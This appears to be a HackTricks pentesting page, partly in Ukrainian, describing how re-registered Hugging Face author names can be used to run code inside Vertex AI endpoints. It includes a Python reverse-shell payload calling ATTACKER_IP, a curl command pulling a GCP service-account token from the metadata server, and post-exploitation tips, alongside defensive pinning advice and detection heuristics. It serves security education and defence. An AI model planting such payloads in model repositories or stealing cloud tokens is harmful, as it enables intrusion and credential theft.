# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenario

- Vertex AI Model Garden дозволяє безпосередньо розгортати багато Hugging Face (HF) моделей.
- HF model identifiers are Author/ModelName. Якщо автор/організація на HF видаляється, те саме ім'я автора може бути перереєстроване будь-ким. Атакуючі можуть створити repo з тим самим ModelName за старим шляхом.
- Pipelines, SDKs, або cloud catalogs, які підтягують за ім'ям (без pinning/integrity), підтягнуть repo під контролем атакуючого. Коли модель буде розгорнута, loader code з цього repo може виконатися всередині контейнера endpoint Vertex AI, надаючи RCE з дозволами endpoint.

Two common takeover cases on HF:
- Ownership deletion: Старий шлях повертає 404, поки хтось не перереєструє автора і не опублікує той самий ModelName.
- Ownership transfer: HF повертає 307 редиректи зі старого Author/ModelName на нового автора. Якщо старий автор пізніше видаляється і його ім'я перереєструє атакуючий, ланцюжок редиректів буде порушений і repo атакуючого обслуговуватиме старий шлях.

## Identifying Reusable Namespaces (HF)

- Old author deleted: сторінка автора повертає 404; шлях до моделі може повертати 404 до takeover.
- Transferred models: старий шлях моделі повертає 307 на нового власника, поки старий автор існує. Якщо старий автор пізніше видаляється і його ім'я перереєструють, legacy path буде вказувати на repo атакуючого.

Quick checks with curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Повний ланцюг атаки проти Vertex AI

1) Виявити повторно використовувані неймспейси моделей, які Model Garden позначає як deployable:
- Знайти HF models у Vertex AI Model Garden, які все ще відображаються як “verified deployable”.
- Перевірити на HF, чи оригінальний author видалений, або чи модель була передана і старий author пізніше видалений.

2) Повторно зареєструвати видаленого author на HF та відтворити той самий ModelName.

3) Опублікувати шкідливий repo. Включити код, який виконується під час model load. Приклади, які зазвичай виконуються під час HF model load:
- Побічні ефекти в __init__.py репозиторію
- Custom modeling_*.py або processing код, на який посилається config/auto_map
- Шляхи коду, які потребують trust_remote_code=True у Transformers pipelines

4) Розгортання у Vertex AI для спадкового Author/ModelName тепер підтягує репозиторій зловмисника. Лоадер виконується всередині контейнера Vertex AI endpoint.

5) Payload встановлює доступ із середовища endpoint (RCE) з правами endpoint’а.

Приклад фрагмента payload, що виконується при import (тільки для демонстрації):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Примітки
- Реальні лоадери можуть відрізнятися. Багато інтеграцій Vertex AI HF клонують та імпортують модулі з репозиторіїв, на які посилається конфігурація моделі (наприклад, auto_map), що може призвести до виконання коду. Для деяких випадків необхідно trust_remote_code=True.
- The endpoint typically runs in a dedicated container with limited scope, but it is a valid initial foothold for data access and lateral movement in GCP.

## Post-Exploitation Tips (Vertex AI Endpoint)

Once code is running inside the endpoint container, consider:
- Перелічити змінні оточення та метадані для виявлення облікових даних/токенів
- Отримати доступ до приєднаного сховища або змонтованих артефактів моделі
- Взаємодіяти з Google APIs через service account identity (Document AI, Storage, Pub/Sub, etc.)
- Забезпечити персистенцію в артефакті моделі, якщо платформа повторно витягує репозиторій

Enumerate instance metadata if accessible (container dependent):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Рекомендації з безпеки для користувачів Vertex AI

- Закріплюйте моделі за commit у HF loaders, щоб запобігти прихованій заміні:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Реплікуйте перевірені HF models у довірений внутрішній artifact store/registry і розгортайте звідти.
- Постійно скануйте codebases і configs на наявність захардкоджених Author/ModelName, які були deleted/transferred; оновлюйте на нові namespaces або закріплюйте за конкретним commit.
- У Model Garden перевіряйте походження моделі та існування автора перед розгортанням.

## Евристики розпізнавання (HTTP)

- Видалений автор: author page 404; legacy model path 404 до takeover.
- Передана модель: legacy path 307 на нового автора, поки старий автор існує; якщо старого автора пізніше видалять і повторно зареєструють, legacy path починає віддавати attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Перехресні посилання

- Див. ширшу методологію та нотатки щодо ланцюга постачання:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Посилання

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
